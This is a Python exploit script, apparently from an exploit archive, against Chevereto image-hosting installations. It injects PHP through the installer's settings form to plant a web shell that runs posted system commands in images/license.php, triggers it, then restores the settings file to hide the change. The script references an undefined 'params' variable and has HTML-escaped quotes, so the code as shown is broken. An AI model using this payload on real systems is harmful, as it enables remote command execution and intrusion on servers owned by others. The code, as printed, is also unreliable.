# Exploit Author: Jinny Ramsmark 
# Vendor Homepage:  https://chevereto.com/
# Software Link: https://github.com/Chevereto/Chevereto-Free/releases
# Version:  1.0.0 Free - 1.1.4 Free, <= 3.13.4 Core
# Tested on: Ubuntu 19.10, PHP 7.3, Apache/2.4.41
# CVE : N/A

from urllib import request, parse
from time import sleep

#Python3
#Needs to have a valid database server, database and user to exploit
#1.0.0 Free version confirmed vulnerable
#1.1.4 Free version confirmed vulnerable
#3.13.4 Core version confirmed vulnerable

def main():

    target = &#039;http://cheveretoinstallation/&#039;
    cookie = &#039;PHPSESSID=89efba681a8bb81d32cd10d3170baf6e&#039;
    db_host = &#039;ip_to_valid_mysql&#039;
    db_name = &#039;valid_db&#039;
    db_user = &#039;valid_user&#039;
    db_pass = &#039;valid_pass&#039;

    inject = "&#039;;if(strpos(file_get_contents(&#039;images/license.php&#039;), &#039;$_POST[\"ccc\"]&#039;) === false){file_put_contents(&#039;images/license.php&#039;,&#039;if(isset($_POST[\"ccc\"])){;system($_POST[\"ccc\"]);}&#039;);}//"

    #Clean data for when we want to clean up the settings file
    data = parse.urlencode(params).encode()

    #Settings data with injected code
    dataInject = parse.urlencode(params).encode()

    #Do inject
    doPostRequest(target + &#039;install&#039;, dataInject, cookie)
    sleep(1)

    #Request index page to run the injected code
    doRequest(target)

    sleep(1)
    #Do a clean request to clean up the settings.php file
    doPostRequest(target + &#039;install&#039;, data, cookie)

def doPostRequest(target, data, cookie):
    req = request.Request(target, data=data)
    req.add_header(&#039;Cookie&#039;, cookie)
    resp = request.urlopen(req)

def doRequest(target):
    req = request.Request(target)
    resp = request.urlopen(req)

if __name__ == &#039;__main__&#039;:
    main()

